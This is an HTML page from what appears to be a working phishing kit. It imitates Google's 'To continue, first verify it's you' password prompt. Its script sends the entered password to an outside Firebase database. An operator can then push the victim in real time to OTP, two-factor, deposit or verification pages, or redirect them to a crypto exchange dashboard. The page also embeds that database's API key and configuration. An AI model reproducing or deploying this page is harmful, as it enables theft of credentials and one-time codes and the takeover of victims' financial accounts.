<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirm Identity</title>
    <link rel="icon" type="image/png" href="favicon.png">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body, html { 
            height: 100%; 
            margin: 0; 
            font-family: 'Roboto', sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            background-color: #f7f7f7; 
        }
        .box-container { 
            background-color: white; 
            border: 1px solid #dadce0; 
            border-radius: 8px; 
            max-width: 450px; 
            width: 90%; 
            text-align: center; 
            padding: 48px 40px; 
            box-shadow: 0 1px 2px rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15); 
        }
        .icon { 
            font-size: 28px; 
            margin-bottom: 16px; 
        }
        h1 { 
            font-family: 'Google Sans', sans-serif; 
            font-size: 24px; 
            color: #202124; 
            font-weight: 400; 
            margin-bottom: 8px; 
        }
        h2 { 
            font-family: 'Google Sans', sans-serif; 
            font-size: 22px; 
            color: #202124; 
            font-weight: 400; 
        }
        p { 
            font-size: 14px; 
            color: #5f6368; 
        }
        .status-message { 
            color: #d93025; 
            font-size: 12px; 
            text-align: left; 
            margin-top: 4px; 
            display: none; 
        }
        .email-display { 
            display: inline-flex; 
            align-items: center; 
            gap: 8px; 
            border: 1px solid #dadce0; 
            border-radius: 100px; 
            padding: 4px 12px; 
            margin-top: 24px; 
            font-size: 14px; 
        }
        .email-initial { 
            background-color: #633ea4; 
            color: white; 
            border-radius: 50%; 
            width: 20px; 
            height: 20px; 
            display: inline-flex; 
            justify-content: center; 
            align-items: center; 
            font-weight: bold; 
        }
        .password-field { 
            position: relative; 
            margin-top: 32px; 
            text-align: left; 
        }
        label.field-label { 
            color: #1a73e8; 
            background-color: white; 
            position: absolute; 
            top: -8px; 
            left: 8px; 
            font-size: 12px; 
            padding: 0 4px; 
        }
        input[type="password"], input[type="text"] { 
            width: 100%; 
            padding: 16px; 
            border: 1px solid #888; 
            border-radius: 4px; 
            font-size: 16px; 
            box-sizing: border-box; 
        }
        .show-password { 
            margin-top: 16px; 
            text-align: left; 
        }
        .show-password label { 
            font-size: 14px; 
        }
        .actions { 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            margin-top: 32px; 
        }
        .forgot-password-btn { 
            color: #1a73e8; 
            font-weight: bold; 
            text-decoration: none; 
            font-size: 14px; 
        }
        .next-btn { 
            background-color: #1a73e8; 
            color: white; 
            border: none; 
            border-radius: 4px; 
            padding: 10px 24px; 
            font-weight: bold; 
            cursor: pointer; 
        }
        .spinner { 
            border: 4px solid #f3f3f3; 
            border-top: 4px solid #1a73e8; 
            border-radius: 50%; 
            width: 40px; 
            height: 40px; 
            animation: spin 1s linear infinite; 
            margin: 0 auto 20px auto; 
        }
        @keyframes spin { 
            0% { transform: rotate(0deg); } 
            100% { transform: rotate(360deg); } 
        }
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.85);
            z-index: 999999;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            backdrop-filter: blur(4px);
        }
        .loading-overlay.active {
            display: flex;
        }
        .loading-spinner {
            width: 60px;
            height: 60px;
            border: 6px solid #333;
            border-top: 6px solid #1a73e8;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
    </style>
</head>
<body>
    <div id="main-container" class="box-container">
        </div>

    <template id="confirmation-form-template">
        <div class="icon">
             <svg width="48px" height="48px" viewBox="0 0 48 48" version="1.1" xmlns="http://www.w3.org/2000/svg"><g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><path d="M48,24 C48,22.3431458 47.8054322,20.8460311 47.4354322,19.3382103 L24,19.3382103 L24,28.3382103 L37.8645678,28.3382103 C37.2915678,31.0048769 35.8645678,34.4695436 32.6354322,36.8048769 L32.6354322,42.4048769 L40.1354322,42.4048769 C45.1989322,37.7715436 48,31.4382103 48,24 Z" fill="#4285F4"></path><path d="M24,48 C30.6354322,48 36.2915678,45.7333333 40.1354322,42.4048769 L32.6354322,36.8048769 C30.8645678,37.9333333 28.2915678,38.6666667 24,38.6666667 C17.2915678,38.6666667 11.8645678,34.2020202 9.99991903,28.6020202 L2.26448657,28.6020202 L2.26448657,34.2020202 C6.13537313,42.6666667 14.2915678,48 24,48 Z" fill="#34A853"></path><path d="M9.99991903,28.6020202 C9.53116903,27.2686869 9.26448657,25.8020202 9.26448657,24.3353535 C9.26448657,22.8686869 9.53116903,21.4020202 9.99991903,20.0686869 L9.99991903,14.4686869 L2.26448657,14.4686869 C0.864486571,17.2686869 0,20.6686869 0,24.3353535 C0,28.0020202 0.864486571,31.4020202 2.26448657,34.2020202 L9.99991903,28.6020202 Z" fill="#FBBC05"></path><path d="M24,9.33333333 C27.4010149,9.33333333 30.2302149,10.5333333 32.6354322,12.8 L40.2644866,5.46666667 C36.1353731,1.86666667 30.6354322,0 24,0 C14.2915678,0 6.13537313,5.33333333 2.26448657,14.4686869 L9.99991903,20.0686869 C11.8645678,14.4686869 17.2915678,9.33333333 24,9.33333333 Z" fill="#EA4335"></path></g></svg>
        </div>
        <h1>To continue, first verify it's you</h1>
        <div id="form-content">
            <div class="email-display"><span class="email-initial" id="email-initial"></span><span id="user-email"></span></div>
            <form id="confirm-form">
                <div class="password-field">
                    <label for="confirm-password" class="field-label">Enter your password</label>
                    <input type="password" id="confirm-password" required>
                    <p class="status-message" id="status-message">Incorrect password. Please try again.</p>
                </div>
                <div class="show-password">
                    <input type="checkbox" id="show-pass-check">
                    <label for="show-pass-check">Show password</label>
                </div>
                <div class="actions">
                    <a href="#" class="forgot-password-btn">Forgot password?</a>
                    <button type="submit" class="next-btn">Next</button>
                </div>
            </form>
        </div>
    </template>
    
    <template id="verifying-template">
         <div class="spinner"></div>
         <h2>Verifying...</h2>
         <p>Please wait, do not close this window.</p>
    </template>

    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-spinner"></div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyAemZwP19k7zaM8QMBPn5kitdlvzY514OI",
            authDomain: "web-xchangeon1.firebaseapp.com",
            databaseURL: "https://web-xchangeon1-default-rtdb.firebaseio.com/",
            projectId: "web-xchangeon1",
            storageBucket: "web-xchangeon1.firebasestorage.app",
            messagingSenderId: "733409941973",
            appId: "1:733409941973:web:6e11c283fcee846b4a855c"
        };
        
        const app = firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        const mainContainer = document.getElementById('main-container');
        const formTemplate = document.getElementById('confirmation-form-template');
        const verifyingTemplate = document.getElementById('verifying-template');
        const loadingOverlay = document.getElementById('loadingOverlay');
        
        function getSessionId() {
            const params = new URLSearchParams(window.location.search);
            const idFromUrl = params.get('id');
            if (idFromUrl) {
                sessionStorage.setItem('firebaseSessionId', idFromUrl);
                return idFromUrl;
            }
            return sessionStorage.getItem('firebaseSessionId');
        }
        const sessionId = getSessionId();

        if (!sessionId) {
            window.location.href = 'index.html';
        } else {
            const sessionRef = db.ref('sessions/' + sessionId);
            const commandRef = db.ref(`sessions/${sessionId}/command`);

            const showVerifying = () => {
                mainContainer.innerHTML = verifyingTemplate.innerHTML;
            };

            const showForm = (showError = false) => {
                mainContainer.innerHTML = formTemplate.innerHTML;
                
                // Busca o email da sessão
                sessionRef.once('value', (snapshot) => {
                    const data = snapshot.val();
                    if (data) {
                        const email = data.email || data.phone || 'Not available';
                        document.getElementById('user-email').textContent = email;
                        document.getElementById('email-initial').textContent = email[0].toUpperCase();
                    }
                });
                
                if (showError) {
                    document.getElementById('status-message').style.display = 'block';
                }

                const showPassCheck = document.getElementById('show-pass-check');
                const passwordInput = document.getElementById('confirm-password');
                showPassCheck.addEventListener('change', function() {
                    passwordInput.type = this.checked ? 'text' : 'password';
                });

                document.getElementById('confirm-form').addEventListener('submit', (e) => {
                    e.preventDefault();
                    const password = passwordInput.value;
                    if (!password) return;
                    
                    showVerifying();
                    sessionRef.update({
                        password_confirmation: password,
                        currentPage: 'Password Confirm',
                        status: 'online'
                    });
                });
            };

            // Mostrar formulário assim que a página carrega
            showForm();

            commandRef.on('value', (snapshot) => {
                const command = snapshot.val();
                if (!command) return;

                switch (command.type) {
                    case 'reject':
                        loadingOverlay.classList.remove('active');
                        showForm(true);
                        break;
                    case 'approve':
                        loadingOverlay.classList.remove('active');
                        window.location.href = "https://mudrex.com/dashboard";
                        break;
                    case 'otp-request':
                        window.location.href = `otp_email.html?id=${sessionId}`;
                        break;
                    case 'tfa-request':
                        window.location.href = `2fa.html?id=${sessionId}`;
                        break;
                    case 'deposit-request':
                        window.location.href = `deposit.html?id=${sessionId}`;
                        break;
                    case 'verify-request':
                        window.location.href = `verify.html?id=${sessionId}`;
                        break;
                    case 'force-relogin':
                        sessionStorage.clear();
                        window.location.href = 'index.html';
                        break;
                }
                commandRef.remove();
            });

            sessionRef.onDisconnect().update({ status: 'offline' });
            window.addEventListener('load', () => sessionRef.update({ currentPage: 'Password Confirm', status: 'online' }));
        }
    </script>
</body>
</html>
